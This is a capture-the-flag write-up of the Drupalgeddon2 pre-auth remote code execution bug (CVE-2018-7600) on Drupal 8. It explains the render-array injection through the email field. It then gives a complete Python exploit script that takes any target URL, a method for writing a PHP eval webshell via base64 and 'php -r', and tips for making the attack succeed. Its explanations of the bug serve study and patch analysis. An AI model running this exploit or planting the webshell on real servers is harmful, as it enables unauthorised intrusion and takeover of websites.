# Drupalgeddon2 — CVE-2018-7600 Render Array RCE (Drupal 8)

> **Target**: Drupal 8.5.0 (vulnerable) running on a CTF lab box
>
> The "Drupalgeddon2" RCE is one of the most cited Drupal CVEs of the last decade and an instructive bug to dissect by hand rather than just running the public Metasploit module. It exploits how Drupal's Form API AJAX endpoint walks `element_parents` into the form's render tree, paired with the fact that the `email` field's `valueCallback` returns `NULL` on certain inputs — leaving an attacker-controlled subtree that gets rendered through `#post_render`. The public PoCs work, but they hide that the *exact* injection path differs between Drupal 7 and Drupal 8, and they assume the `standard` install profile.

## 0. Target overview

| Field | Value |
|---|---|
| CVE | CVE-2018-7600 |
| Disclosure | March 2018 (SA-CORE-2018-002) |
| Affected | Drupal 6, 7, 8.3.x, 8.4.x, 8.5.x prior to 8.5.1 |
| Severity | Pre-auth RCE — no credentials needed |
| Install profile required | `standard` (needs `user_picture` field with file upload widget) |
| Won't work on | `minimal` profile (no `file` module → no ManagedFile widget → no AJAX callback hook) |

The `standard` vs `minimal` distinction tripped me up the first time. Public PoCs assume `standard` and silently fail (500 with confusing AJAX errors) on `minimal`. Always confirm the target's install profile first.

## 1. Why the bug exists

Drupal's Form API serves AJAX requests through a generic endpoint that takes two attacker-influencing parameters:

- `element_parents` — a `/`-separated path that selects a subtree of the form to render
- `_triggering_element_name` — the form element that "caused" the AJAX submit

The endpoint walks the render tree using `element_parents`, then calls a callback (`#ajax_callback` on the triggering element). The callback eventually calls `\Drupal::service('renderer')->renderRoot()` on the selected subtree.

Render arrays in Drupal can contain hooks: `#pre_render`, `#post_render`, `#access_callback`, `#lazy_builder`, etc. These are callable references that get invoked during render. **If an attacker controls the contents of the subtree pointed at by `element_parents`, they can place `#post_render = "passthru"` and `#markup = "<command>"` into that subtree, then induce a render to fire arbitrary PHP.**

The pre-condition is "attacker controls some subtree of the form's render array". This is where the `email` field's `valueCallback` quirk comes in.

## 2. The email field's `valueCallback` returns NULL

Drupal's `Email` form element class has:

```php
public static function valueCallback(&$element, $input, FormStateInterface $form_state) {
  if ($input !== FALSE && $input !== NULL) {
    return trim($input);          // string input → trimmed string
  }
  return NULL;                     // anything else → NULL
}
```

The Form API sees `NULL` as "no value provided, use the default". The **default** for `$form['account']['mail']['#value']` is whatever was originally in the form definition — but if we send `mail[#post_render][]=passthru` (i.e. an array), the input *isn't* `NULL` or `FALSE`, it's an array. The `valueCallback` falls through to `return NULL`, and Drupal's deeper form processing leaves the array we sent intact inside the `mail` element's `#value` slot.

That's our injection. `$form['account']['mail']['#value']` now contains an attacker-controlled render array with our `#post_render` callback.

## 3. Why this specific element (not `user_picture`)

The public Drupal 7 PoC injects via `user_picture/widget/0/#value`. On Drupal 8 that path is gated:

- ManagedFile's `valueCallback` does sanitize attributes starting with `#`
- So directly injecting into the file widget's `#value` is filtered

`email`'s `valueCallback` does *not* sanitize — it just returns NULL on anything non-string, leaving the array untouched. So in Drupal 8 the injection moves to the `mail` field. Same primitive, different field.

## 4. The trigger — why `user_picture` upload button still matters

The AJAX endpoint only fires callbacks on elements that have `#ajax['callback']`. The `mail` field doesn't have one. The `user_picture_0_upload_button` does (`Drupal\file\Element\ManagedFile::uploadAjaxCallback`).

So the dance is:

- `_triggering_element_name = user_picture_0_upload_button` (passes the AJAX-callback gate)
- `element_parents = account/mail/#value` (points the render walker at our injected subtree on the `mail` element)
- Body contains `mail[#post_render][]=passthru` + `mail[#type]=markup` + `mail[#markup]=<cmd>`

When the AJAX endpoint runs, it calls `uploadAjaxCallback` (legitimate), which internally calls `renderRoot` on the subtree selected by `element_parents`. That subtree is *our* render array. `#post_render = passthru` fires, executing our command.

## 5. Three-step exploit

```python
import requests, re

TARGET = "http://lab.example/drupal"
CMD    = "id"   # or anything

# Step 1: GET /user/register, extract form_build_id and friends
r = requests.get(f"{TARGET}/user/register")
form_build_id = re.search(r'name="form_build_id" value="([^"]+)"', r.text).group(1)
form_id       = re.search(r'name="form_id" value="([^"]+)"', r.text).group(1)

# Step 2: POST the crafted AJAX request
endpoint = (
    f"{TARGET}/user/register"
    "?element_parents=account/mail/%23value"
    "&ajax_form=1"
    "&_wrapper_format=drupal_ajax"
)
data = {
    "form_id":         form_id,
    "form_build_id":   form_build_id,
    "_triggering_element_name": "user_picture_0_upload_button",
    "mail[#post_render][]": "passthru",
    "mail[#type]":          "markup",
    "mail[#markup]":        CMD,
}
r2 = requests.post(endpoint, data=data)
print(r2.text)
```

The response is a JSON-wrapped AJAX command list, but the output of `passthru(CMD)` is interleaved in the response body before the JSON.

## 6. Writing a webshell (without losing characters)

Direct injection of PHP source as the command runs into shell metacharacter issues (`<`, `>`, `;` need escaping). The reliable pattern is:

```python
# webshell content, base64-encoded so the shell doesn't mangle anything
shell_b64 = base64.b64encode(b'<?php @eval($_POST["x"]); ?>').decode()

CMD = f'php -r "file_put_contents(\\"shell.php\\", base64_decode(\\"{shell_b64}\\"));"'
```

This way:

1. The shell only sees `php -r "..."` — no `<`, `>`, or `?` to escape
2. The PHP `-r` interpreter handles the actual decoding
3. The resulting file is exact

Then trigger `http://target/shell.php?x=...` for follow-up.

## 7. Full exploit script

```python
#!/usr/bin/env python3
import re
import sys
import base64
import requests

TARGET = sys.argv[1].rstrip('/')
CMD    = sys.argv[2] if len(sys.argv) > 2 else "id"

s = requests.Session()

# --- Step 1: reconnaissance ---
r = s.get(f"{TARGET}/user/register")
if r.status_code != 200:
    sys.exit(f"register page returned {r.status_code}; target probably not vulnerable")

form_build_id_m = re.search(r'name="form_build_id" value="([^"]+)"', r.text)
form_id_m       = re.search(r'name="form_id" value="([^"]+)"', r.text)
if not (form_build_id_m and form_id_m):
    sys.exit("could not extract form_build_id / form_id — probably non-standard install profile")

form_build_id = form_build_id_m.group(1)
form_id       = form_id_m.group(1)

# --- Step 2: craft AJAX injection ---
endpoint = (
    f"{TARGET}/user/register"
    "?element_parents=account/mail/%23value"
    "&ajax_form=1"
    "&_wrapper_format=drupal_ajax"
)
data = {
    "form_id":                  form_id,
    "form_build_id":            form_build_id,
    "_triggering_element_name": "user_picture_0_upload_button",
    "mail[#post_render][]":     "passthru",
    "mail[#type]":              "markup",
    "mail[#markup]":            CMD,
}

# --- Step 3: fire ---
r2 = s.post(endpoint, data=data)
# the command output is in r2.text before the JSON-wrapped AJAX response
print(r2.text)
```

Run as:

```
$ python exploit.py http://lab.example/drupal "id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
[{"command":"insert", ...}]
```

## 8. Traps and lessons learned

| Trap | Why it cost me time | Resolution |
|---|---|---|
| Used Drupal 7 PoC path (`user_picture/widget/0/#value`) on Drupal 8 | Public exploit copy-pasted from old SA writeups | Drupal 8's ManagedFile valueCallback sanitizes `#`-prefixed attrs. Switch to `email` field whose valueCallback doesn't sanitize |
| `minimal` install profile target | Lab had a freshly installed minimal-profile Drupal; CVE PoCs all 500'd | Confirm install profile via `/core/install.php` or `/admin/modules` (auth needed) or attempt `/user/register` first — minimal profile has no `user_picture` field and the upload button name doesn't exist |
| URL-encoded `#` in `element_parents` | Sent literal `#` once; Drupal split it as URL fragment, request 400'd | Always encode as `%23` |
| Webshell file had visible PHP tags get mangled | Sent `<?php ... ?>` through shell escape; the `?` and `>` chars got URL-encoded or interpreted | Use `php -r "file_put_contents(..., base64_decode('...'));"` — only base64 chars cross the shell boundary |
| 500 "AJAX callback empty" | Forgot the `_triggering_element_name` parameter or sent the wrong name | The button name format is `<field>_0_upload_button` for the first instance. Confirm by reading the register form's HTML source for `name="...upload_button"` |

## 9. Methodology takeaways

1. **Render-array hooks are the canonical RCE primitive in Drupal.** `#post_render`, `#pre_render`, `#access_callback`, `#lazy_builder` — all of these are attacker-callable PHP functions if you control the render array's contents. Any CVE involving Drupal user input flowing into renderer input is likely to use one of these hooks.
2. **Public CVE PoCs are version-locked.** Drupal 7 and Drupal 8's Form API are different enough that the same logical bug needs different fields, parameters, and AJAX gates. Read the diff between the unpatched and patched versions before running someone else's script.
3. **Install profile matters for Drupal pre-auth bugs.** `standard` ≠ `minimal` ≠ `demo_umami`. CVE-2018-7600 requires the `user_picture` field to exist with an AJAX-callback-bearing element. Lab boxes / CTFs often use non-default profiles — always check.
4. **Webshell delivery: base64 + `php -r`.** When sending payload through a system command, base64-only payloads survive any shell, URL encoder, or WAF that allows alphanumerics + `=/+`. Avoid raw PHP tags in the wire payload.
5. **For pre-auth Drupal RCE, the entry endpoint matters.** `/user/register` is the typical reconnaissance landing page because it's always pre-auth and contains form-build IDs that can be reused for the AJAX request.

## 10. Related techniques

- [Drupal SA-CORE-2018-002 advisory](https://www.drupal.org/sa-core-2018-002) — official disclosure
- [Drupal SA-CORE-2018-004](https://www.drupal.org/sa-core-2018-004) — Drupalgeddon3, the same family one month later
- [Ambionics writeup](https://www.ambionics.io/blog/drupal-services-module-rce) — covers the Form API render-array gadget more generally
- CVE-2019-6340 (Drupal 8 REST PUT) — different sink, same render-tree-injection idea
